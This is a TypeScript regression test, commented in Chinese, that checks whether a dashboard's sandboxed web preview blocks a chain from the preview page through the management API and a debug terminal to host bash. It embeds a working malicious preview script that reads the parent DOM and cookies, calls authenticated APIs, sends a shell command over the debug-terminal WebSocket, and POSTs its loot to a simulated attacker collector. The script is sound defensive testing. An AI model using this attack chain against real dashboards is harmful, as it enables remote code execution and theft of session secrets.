#!/usr/bin/env tsx
/**
 * P0 回归证据：Web 预览必须是 opaque origin，宿主 bash RCE 链必须断死。
 *
 * 原漏洞链（未修前真实可复现）：
 *   预览 iframe 无 sandbox、内容又挂在 Dashboard 同源的 /preview/… 之下
 *   → agent 的 dev server 页面拿到 Dashboard origin
 *   → 读 parent DOM / 带 owner cookie 调 /api/*
 *   → POST /api/debug-terminal 拿到 id，再连 /debug-terminal/<id>/ws
 *   → 宿主上一个裸 bash。
 *
 * 本脚本用真实 Chromium + 真实 debug-terminal（真的 spawn /bin/bash）跑完整条链：
 * 恶意预览页会把每一步的结果既写进自己的 window，也回传给「外部收集器」，
 * 我们对两侧同时断言。修复后每一步都必须失败，而预览自身的相对脚本与 WebSocket
 * 必须照常工作——只断攻击链，不断功能。
 *
 * 跑法：
 *   npx tsx scripts/verify-preview-origin-isolation.ts
 *
 * 反转验证（先红后绿）：把 preview-guard-page.ts 里 iframe 的 sandbox 属性去掉、
 * 并把 preview-proxy.ts 里追加 CSP sandbox 的那几行注释掉，再跑本脚本——
 * parent DOM、/api/sessions、debug-terminal WS 三条断言会立刻炸开。
 */
import assert from 'node:assert/strict';
import { constants } from 'node:fs';
import { access, writeFile } from 'node:fs/promises';
import { createServer, type IncomingMessage, type Server, type ServerResponse } from 'node:http';
import { homedir } from 'node:os';
import { dirname, join } from 'node:path';
import type { Duplex } from 'node:stream';
import { fileURLToPath } from 'node:url';
import { chromium, type Frame } from 'playwright';
import { WebSocket, WebSocketServer } from 'ws';
import { resolvePreviewPortOwner } from '../src/core/preview-port-owner.js';
import { PREVIEW_CONTENT_SEGMENT } from '../src/core/session-preview.js';
import { createDebugTerminalManager } from '../src/dashboard/debug-terminal.js';
import { createPreviewGuardPage } from '../src/dashboard/preview-guard-page.js';
import {
  PREVIEW_SANDBOX_TOKENS,
  createSessionPreviewProxy,
  type PreviewProxyResolution,
} from '../src/dashboard/preview-proxy.js';
import {
  mintPreviewContentCapability,
  verifyPreviewContentCapability,
} from '../src/dashboard/preview-content-capability.js';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const resultPath = join(root, 'docs', 'assets', 'preview-origin-isolation-results.json');

/** Values that must never reach agent-controlled code. Each is asserted by
 *  identity against everything the malicious page managed to collect. */
const DASHBOARD_TOKEN = 'p0-dashboard-owner-token-must-not-leak';
const SESSION_INVENTORY_MARKER = 'p0-session-inventory-must-not-leak';
const RCE_MARKER = 'P0_HOST_BASH_REACHED';
const SESSION_ID = 'p0-preview-session';
const CAPABILITY_SECRET = 'p0-preview-capability-secret-not-a-real-credential';

interface SeenRequest {
  path: string;
  cookie: string | null;
  origin: string | null;
  secFetchSite: string | null;
}

const frontRequests: SeenRequest[] = [];
const exfiltrated: string[] = [];
let debugUpgradeAttempts = 0;
let debugUpgradeAccepted = 0;

function json(res: ServerResponse, status: number, value: unknown, extra: Record<string, string> = {}): void {
  res.writeHead(status, {
    'content-type': 'application/json; charset=utf-8',
    'cache-control': 'no-store',
    ...extra,
  });
  res.end(JSON.stringify(value));
}

async function listen(server: Server): Promise<number> {
  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', resolve);
  });
  const address = server.address();
  if (!address || typeof address === 'string') throw new Error('unable to resolve local port');
  return address.port;
}

async function closeServer(server: Server): Promise<void> {
  server.closeAllConnections?.();
  await new Promise<void>(resolve => server.close(() => resolve()));
}

async function executablePath(): Promise<string | undefined> {
  const candidates = [
    process.env.BOTMUX_WORKBENCH_BROWSER_EXECUTABLE?.trim(),
    join(homedir(), '.cache', 'ui-check', 'chrome-headless-shell-linux64', 'chrome-headless-shell'),
    '/usr/bin/chromium',
    '/usr/bin/google-chrome',
  ].filter((value): value is string => Boolean(value));
  for (const candidate of candidates) {
    try {
      await access(candidate, constants.X_OK);
      return candidate;
    } catch { /* fall through to Playwright's managed Chromium */ }
  }
  return undefined;
}

// ── 外部收集器：模拟攻击者自己的服务器，CORS 全开，能收到什么就收什么 ──────────
const collectorRequests: Array<{ path: string; body: string }> = [];
const collector = createServer((req, res) => {
  const chunks: Buffer[] = [];
  req.on('data', chunk => chunks.push(chunk as Buffer));
  req.on('end', () => {
    const body = Buffer.concat(chunks).toString('utf8');
    collectorRequests.push({ path: req.url ?? '', body });
    exfiltrated.push(`${req.url ?? ''}\n${body}`);
    res.writeHead(200, {
      'access-control-allow-origin': '*',
      'content-type': 'text/plain',
    });
    res.end('collected');
  });
});
const collectorPort = await listen(collector);
const collectorBase = `http://127.0.0.1:${collectorPort}`;

// ── agent 的 dev server：这就是被攻陷/恶意的一侧 ────────────────────────────────
/** 攻击者「已经知道」的调试终端 id——把断言从「猜不到 id」提升到「即使知道 id 也连不上」。 */
let knownDebugTerminalId = '';
const attackReports: unknown[] = [];

function attackScript(): string {
  return `
(function(){
  var out = { relativeScriptExecuted: true, origin: String(window.origin) };
  function note(key, fn) {
    try { out[key] = fn(); } catch (e) { out[key] = 'THREW:' + (e && e.name ? e.name : 'Error'); }
  }
  note('parentDomRead', function(){ return String(parent.document.body.innerHTML).slice(0, 200); });
  note('parentLocation', function(){ return String(parent.location.href); });
  // Deliberately a READ of the parent's script context rather than a top
  // navigation: actually navigating the dashboard away succeeds in the
  // unfixed build and would tear the page down before anything can be
  // asserted. Reaching the parent's globals is the same capability.
  note('parentGlobals', function(){ return String(parent.window.location.pathname); });
  note('cookieRead', function(){ return String(document.cookie); });
  note('localStorage', function(){ localStorage.setItem('probe', '1'); return 'WRITABLE'; });

  function socket(url, payload) {
    return new Promise(function(resolve){
      var settled = false;
      function done(value){ if (!settled) { settled = true; resolve(value); } }
      var ws;
      try { ws = new WebSocket(url); } catch (e) { return done('THREW:' + e.name); }
      var timer = setTimeout(function(){ try { ws.close(); } catch (e) {} done('timeout'); }, 4000);
      ws.onopen = function(){ if (payload) ws.send(payload); };
      ws.onmessage = function(ev){ clearTimeout(timer); done('message:' + String(ev.data).slice(0, 400)); };
      ws.onerror = function(){ clearTimeout(timer); done('error'); };
      ws.onclose = function(ev){ clearTimeout(timer); done('closed:' + ev.code); };
    });
  }

  function attempt(key, promise) {
    return promise.then(function(value){ out[key] = value; }, function(e){ out[key] = 'THREW:' + (e && e.name ? e.name : 'Error'); });
  }

  var host = location.protocol.replace('http', 'ws') + '//' + location.host;
  Promise.resolve()
    // ② 带 Dashboard cookie 调管理 API
    .then(function(){
      return attempt('apiSessions', fetch('/api/sessions', { credentials: 'include' }).then(function(r){
        return r.text().then(function(t){ return { status: r.status, body: t.slice(0, 400) }; });
      }));
    })
    // ③ RCE 链第一跳：创建 debug terminal
    .then(function(){
      return attempt('debugCreate', fetch('/api/debug-terminal', {
        method: 'POST',
        credentials: 'include',
        headers: { 'content-type': 'text/plain' },
        body: '{}'
      }).then(function(r){
        return r.text().then(function(t){ return { status: r.status, body: t.slice(0, 400) }; });
      }));
    })
    // ③ RCE 链第二跳：即便 id 已知，也要连不上那个裸 bash
    .then(function(){
      return attempt('debugSocketKnownId', socket(host + '/debug-terminal/' + ${JSON.stringify('')} + window.__knownDebugTerminalId + '/ws',
        JSON.stringify({ type: 'input', data: 'echo ${RCE_MARKER}\\n' })));
    })
    // ④ 预览自身功能：相对资源已执行（见 relativeScriptExecuted），自己的 WS 必须通
    .then(function(){ return attempt('ownWebSocket', socket(host + location.pathname.replace(/[^/]*$/, '') + 'ws', 'ping')); })
    .then(function(){
      return attempt('ownRelativeFetch', fetch('./self-check').then(function(r){
        return r.text().then(function(t){ return { status: r.status, body: t.slice(0, 120) }; });
      }));
    })
    // 把「战利品」外传给攻击者自己的服务器，并回报给 dev server 自身
    .then(function(){
      var loot = JSON.stringify(out);
      return attempt('exfiltration', fetch(${JSON.stringify(collectorBase)} + '/collect', {
        method: 'POST', mode: 'cors', headers: { 'content-type': 'text/plain' }, body: loot
      }).then(function(r){ return 'sent:' + r.status; }));
    })
    .then(function(){
      return fetch('./report', { method: 'POST', headers: { 'content-type': 'text/plain' }, body: JSON.stringify(out) })
        .catch(function(){ /* reported through window as well */ });
    })
    .then(function(){ window.__attackResult = out; window.__attackDone = true; });
})();
`;
}

const evilUpstreamSockets = new Set<WebSocket>();
const evilUpstream = createServer((req, res) => {
  const path = (req.url ?? '/').split('?')[0];
  if (path === '/attack.js') {
    res.writeHead(200, { 'content-type': 'text/javascript; charset=utf-8' });
    res.end(attackScript());
    return;
  }
  if (path === '/self-check') {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('preview-own-resource-ok');
    return;
  }
  if (path === '/report' && req.method === 'POST') {
    const chunks: Buffer[] = [];
    req.on('data', chunk => chunks.push(chunk as Buffer));
    req.on('end', () => {
      try { attackReports.push(JSON.parse(Buffer.concat(chunks).toString('utf8'))); }
      catch { attackReports.push({ malformed: true }); }
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('reported');
    });
    return;
  }
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  // Relative script tag on purpose: it is the "preview still works" control.
  res.end(`<!doctype html><html><body><h1>agent dev server</h1>`
    + `<script>window.__knownDebugTerminalId=${JSON.stringify(knownDebugTerminalId)}</script>`
    + `<script src="./attack.js"></script></body></html>`);
});
const evilWss = new WebSocketServer({ server: evilUpstream });
evilWss.on('connection', socket => {
  evilUpstreamSockets.add(socket);
  socket.on('message', data => socket.send(`preview-own-ws:${data.toString()}`));
  socket.on('close', () => evilUpstreamSockets.delete(socket));
});
const evilPort = await listen(evilUpstream);

// P1-12 之后 SessionPreviewTarget 必须带「谁持有这个端口」的证明，缺证明的目标会被
// safeSessionPreviewTarget 归零、代理直接回 409 invalid_preview_target。这里求一份
// **真的** procfs 证明而不是编一个假的：恶意 dev server 就监听在本进程里，所以用本
// 进程 pid 作血缘根，走的是生产同一条 resolvePreviewPortOwner。这样这条 P0 回归依旧
// 跑在完整的硬化契约上——它要证的是「预览内容确实被代理进来了、而攻击链断死」，
// 绝不能靠绕过归属校验来让自己变绿。
const evilOwner = resolvePreviewPortOwner({
  host: '127.0.0.1',
  port: evilPort,
  ownerPids: [process.pid],
});
assert.ok(
  evilOwner.ok,
  `harness could not prove ownership of its own dev-server port (${(evilOwner as { reason?: string }).reason})`
  + ' — this P0 harness requires Linux procfs',
);
const evilTargetOwner = evilOwner.proof;

// ── Dashboard 前门：真 guard shell + 真 preview proxy + 真 debug terminal ──────
const debugTerminals = createDebugTerminalManager({
  getActiveToken: () => DASHBOARD_TOKEN,
  defaultWorkingDirs: () => [root],
});

function ownerCookiePresent(req: IncomingMessage): boolean {
  return (req.headers.cookie ?? '').split(';')
    .some(part => part.trim() === `botmux_dashboard_token=${DASHBOARD_TOKEN}`);
}

function resolvePreview(sessionId: string): PreviewProxyResolution {
  return sessionId === SESSION_ID
    ? {
      ok: true,
      target: {
        host: '127.0.0.1',
        port: evilPort,
        registeredAt: new Date().toISOString(),
        owner: evilTargetOwner,
        workerGeneration: 1,
      },
    }
    : { ok: false, status: 404, error: 'preview_not_registered' };
}

const previewProxy = createSessionPreviewProxy({
  authenticated: ownerCookiePresent,
  resolve: resolvePreview,
  verifyContentCapability: (capability, sessionId) =>
    verifyPreviewContentCapability(CAPABILITY_SECRET, capability, sessionId).ok,
});
const previewGuard = createPreviewGuardPage({
  authenticated: ownerCookiePresent,
  resolve: resolvePreview,
  mintContentCapability: (req, sessionId) => (ownerCookiePresent(req)
    ? mintPreviewContentCapability(CAPABILITY_SECRET, sessionId, {
      userId: 'ou_owner',
      authSessionId: 'p0-auth-session',
      expiresAt: Date.now() + 60 * 60_000,
    })
    : null),
  // 这条链验的是 owner 身份下的 origin 隔离，解锁入口照常渲染。
  canInteract: ownerCookiePresent,
});

async function handleFront(req: IncomingMessage, res: ServerResponse): Promise<void> {
  const url = new URL(req.url ?? '/', 'http://127.0.0.1');
  frontRequests.push({
    path: url.pathname,
    cookie: req.headers.cookie ?? null,
    origin: typeof req.headers.origin === 'string' ? req.headers.origin : null,
    secFetchSite: typeof req.headers['sec-fetch-site'] === 'string' ? req.headers['sec-fetch-site'] : null,
  });

  // 管理 API：与真实 Dashboard 一样，未认证一律 401。
  if (url.pathname === '/api/sessions') {
    if (!ownerCookiePresent(req)) return json(res, 401, { ok: false, error: 'authentication_required' });
    return json(res, 200, { ok: true, sessions: [{ sessionId: SESSION_ID, secret: SESSION_INVENTORY_MARKER }] });
  }
  if (url.pathname.startsWith('/api/debug-terminal') || url.pathname.startsWith('/debug-terminal/')) {
    // Auth gate first, exactly like dashboard.ts mounts it.
    if (!ownerCookiePresent(req)) return json(res, 401, { ok: false, error: 'authentication_required' });
    if (debugTerminals.handleHttp(req, res, url)) return;
    return json(res, 404, { ok: false, error: 'not_found' });
  }

  if (previewGuard.handle(req, res, url)) return;
  if (await previewProxy.handleHttp(req, res, url)) return;

  res.writeHead(404, { 'content-type': 'text/plain' });
  res.end('not found');
}

const front = createServer((req, res) => {
  void handleFront(req, res).catch(() => {
    if (!res.headersSent) json(res, 500, { ok: false, error: 'harness_error' });
    else res.end();
  });
});
front.on('upgrade', (req, socket, head) => {
  const pathname = (req.url ?? '/').split('?')[0];
  if (pathname.startsWith('/debug-terminal/')) {
    debugUpgradeAttempts += 1;
    const before = debugUpgradeAttempts;
    // The manager self-authenticates; count an accepted upgrade by watching for
    // the socket surviving the call.
    const handled = debugTerminals.handleUpgrade(req, socket as Duplex, head);
    if (handled && !socket.destroyed) debugUpgradeAccepted = before;
    if (handled) return;
  }
  if (previewProxy.handleUpgrade(req, socket as Duplex, head)) return;
  socket.destroy();
});
const frontPort = await listen(front);
const base = `http://127.0.0.1:${frontPort}`;

// Pre-create a debug terminal AS THE AUTHENTICATED OWNER and prime it with a
// marker, so "the attacker already knows the id" is the starting position.
const created = await fetch(`${base}/api/debug-terminal`, {
  method: 'POST',
  headers: { cookie: `botmux_dashboard_token=${DASHBOARD_TOKEN}`, 'content-type': 'application/json' },
  body: JSON.stringify({ workingDir: root }),
}).then(response => response.json() as Promise<{ ok: boolean; id: string }>);
assert.equal(created.ok, true, 'harness could not create the reference debug terminal');
knownDebugTerminalId = created.id;

const browserPath = await executablePath();
const browser = await chromium.launch({
  headless: true,
  ...(browserPath ? { executablePath: browserPath } : {}),
});

interface AttackResult {
  relativeScriptExecuted?: boolean;
  origin?: string;
  parentDomRead?: string;
  parentLocation?: string;
  parentGlobals?: string;
  cookieRead?: string;
  localStorage?: string;
  apiSessions?: { status: number; body: string } | string;
  debugCreate?: { status: number; body: string } | string;
  debugSocketKnownId?: string;
  ownWebSocket?: string;
  ownRelativeFetch?: { status: number; body: string } | string;
  exfiltration?: string;
}

const findings: Record<string, unknown> = {};

try {
  const context = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  await context.addCookies([{
    name: 'botmux_dashboard_token',
    value: DASHBOARD_TOKEN,
    url: base,
    httpOnly: true,
    sameSite: 'Lax',
  }]);
  const page = await context.newPage();
  await page.goto(`${base}/preview/${SESSION_ID}/`);

  // 结构证据先采集、不先断言：behaviour 才是这条 P0 的主证据，结构断言留到最后，
  // 免得反转验证时结构断言先炸、把真正的攻击链结果掩掉。
  const sandbox = await page.locator('iframe#app').getAttribute('sandbox');
  findings.iframeSandbox = sandbox;

  const contentFrame = await (async (): Promise<Frame> => {
    for (let attempt = 0; attempt < 100; attempt += 1) {
      const found = page.frames().find(frame => frame.url().includes(`/${PREVIEW_CONTENT_SEGMENT}/`));
      if (found) return found;
      await page.waitForTimeout(100);
    }
    throw new Error('sandboxed preview frame never appeared');
  })();

  await contentFrame.waitForFunction(() => Boolean((window as unknown as { __attackDone?: boolean }).__attackDone), null, { timeout: 30_000 });
  const result = await contentFrame.evaluate(() => (window as unknown as { __attackResult: AttackResult }).__attackResult) as AttackResult;
  findings.attack = result;
  // Always dump the raw attack outcome: on a red run this IS the evidence that
  // the chain was live, and on a green run it shows every step failing.
  process.stderr.write(`[preview-origin-isolation] attack outcome: ${JSON.stringify(result)}\n`);

  // ── ① parent DOM 读不到 ────────────────────────────────────────────────────
  assert.equal(result.origin, 'null', `preview document is not an opaque origin (origin=${result.origin})`);
  assert.match(String(result.parentDomRead), /^THREW:/, `parent DOM was readable: ${result.parentDomRead}`);
  assert.match(String(result.parentLocation), /^THREW:/, `parent location was readable: ${result.parentLocation}`);
  assert.match(String(result.parentGlobals), /^THREW:/, `preview reached the dashboard's script context: ${result.parentGlobals}`);
  assert.ok(!PREVIEW_SANDBOX_TOKENS.includes('allow-top-navigation'), 'a preview must never be able to navigate the dashboard away');
  assert.equal(result.cookieRead, 'THREW:SecurityError', `document.cookie was reachable: ${result.cookieRead}`);
  assert.match(String(result.localStorage), /^THREW:/, `same-origin storage was reachable: ${result.localStorage}`);

  // ── ② /api/* 无 owner authority ────────────────────────────────────────────
  const api = result.apiSessions;
  if (typeof api === 'string') {
    assert.match(api, /^THREW:/, `unexpected /api/sessions outcome: ${api}`);
  } else {
    assert.equal(api?.status, 401, `/api/sessions answered with owner authority: ${JSON.stringify(api)}`);
  }
  const apiRequests = frontRequests.filter(entry => entry.path === '/api/sessions');
  assert.ok(apiRequests.length > 0, 'the malicious page never even reached /api/sessions — assertion would be vacuous');
  for (const entry of apiRequests) {
    assert.equal(entry.cookie, null, `/api/sessions carried a cookie from the preview: ${entry.cookie}`);
    assert.equal(entry.origin, 'null', `expected an opaque origin on /api/sessions, saw ${entry.origin}`);
  }

  // ── ③ debug-terminal RCE 链断死 ────────────────────────────────────────────
  const debugCreate = result.debugCreate;
  if (typeof debugCreate === 'string') {
    assert.match(debugCreate, /^THREW:/, `unexpected debug-terminal create outcome: ${debugCreate}`);
  } else {
    assert.equal(debugCreate?.status, 401, `debug terminal was created from the preview: ${JSON.stringify(debugCreate)}`);
    assert.ok(!String(debugCreate?.body ?? '').includes('"id"'), 'a debug terminal id leaked into the preview');
  }
  assert.match(
    String(result.debugSocketKnownId),
    /^(closed:|error|timeout|THREW:)/,
    `the preview reached host bash over the debug WebSocket: ${result.debugSocketKnownId}`,
  );
  assert.ok(
    !String(result.debugSocketKnownId).includes('message:'),
    `the debug terminal streamed data into the preview: ${result.debugSocketKnownId}`,
  );
  assert.equal(debugUpgradeAccepted, 0, 'a debug-terminal WebSocket upgrade was accepted from the preview');
  assert.ok(debugUpgradeAttempts > 0, 'the preview never attempted the debug WebSocket — assertion would be vacuous');

  // ── 外传：能发出去，但里面没有任何值钱的东西 ──────────────────────────────
  assert.ok(collectorRequests.length > 0, 'the malicious page never attempted exfiltration');
  const loot = exfiltrated.join('\n');
  for (const secret of [DASHBOARD_TOKEN, SESSION_INVENTORY_MARKER, RCE_MARKER, knownDebugTerminalId]) {
    assert.ok(!loot.includes(secret), `exfiltrated payload contained a protected value (${secret.slice(0, 24)}…)`);
  }
  findings.exfiltratedBytes = loot.length;
  findings.reportedByPreview = attackReports.length;

  // ── ④ 预览自身功能仍可用 ───────────────────────────────────────────────────
  assert.equal(result.relativeScriptExecuted, true, 'the preview could not even load its own relative script');
  assert.equal(result.ownWebSocket, 'message:preview-own-ws:ping', `the preview lost its own WebSocket: ${result.ownWebSocket}`);
  const ownFetch = result.ownRelativeFetch;
  assert.ok(typeof ownFetch === 'object' && ownFetch?.status === 200, `the preview lost relative fetches: ${JSON.stringify(ownFetch)}`);
  assert.equal(ownFetch?.body, 'preview-own-resource-ok');
  assert.ok(attackReports.length > 0, 'the preview could not POST back to its own dev server');

  // ── 结构：sandbox 属性 + 响应级 CSP sandbox 双保险 ─────────────────────────
  assert.equal(sandbox, PREVIEW_SANDBOX_TOKENS, 'preview iframe lost its sandbox attribute');
  assert.ok(!(sandbox ?? '').includes('allow-same-origin'), 'allow-same-origin re-opens the whole chain');
  const capabilityUrl = contentFrame.url();
  const direct = await context.request.get(capabilityUrl);
  assert.equal(direct.status(), 200, 'the capability URL stopped serving the app');
  findings.contentSecurityPolicy = direct.headers()['content-security-policy'] ?? null;
  assert.ok(
    String(findings.contentSecurityPolicy).includes(`sandbox ${PREVIEW_SANDBOX_TOKENS}`),
    `proxied documents are missing the CSP sandbox: ${findings.contentSecurityPolicy}`,
  );

  await context.close();

  const output = {
    ok: true,
    subject: 'P0 preview opaque-origin isolation',
    browser: browserPath ? 'local executable' : 'Playwright managed Chromium',
    sandbox: PREVIEW_SANDBOX_TOKENS,
    assertions: {
      parentDomUnreadable: true,
      managementApiAnonymous: true,
      debugTerminalUnreachable: true,
      exfiltrationEmpty: true,
      previewOwnResourcesWork: true,
      cspSandboxOnProxiedDocuments: true,
    },
    findings,
  };
  await writeFile(resultPath, `${JSON.stringify(output, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify(output)}\n`);
} finally {
  for (const socket of evilUpstreamSockets) socket.terminate();
  await browser.close();
  debugTerminals.shutdown();
  await new Promise<void>(resolve => evilWss.close(() => resolve()));
  await closeServer(front);
  await closeServer(evilUpstream);
  await closeServer(collector);
}
